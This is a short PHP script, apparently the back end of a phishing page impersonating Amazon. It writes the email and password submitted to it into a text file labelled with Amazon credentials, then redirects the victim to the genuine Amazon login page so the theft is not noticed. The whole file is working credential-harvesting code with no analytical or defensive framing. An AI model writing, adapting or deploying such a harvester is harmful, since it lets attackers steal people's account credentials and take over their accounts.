<?php 
file_put_contents("usernames.txt", "Amazon Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] ."\n", FILE_APPEND);
header('Location: https://amazon.com/login');
exit();
?>
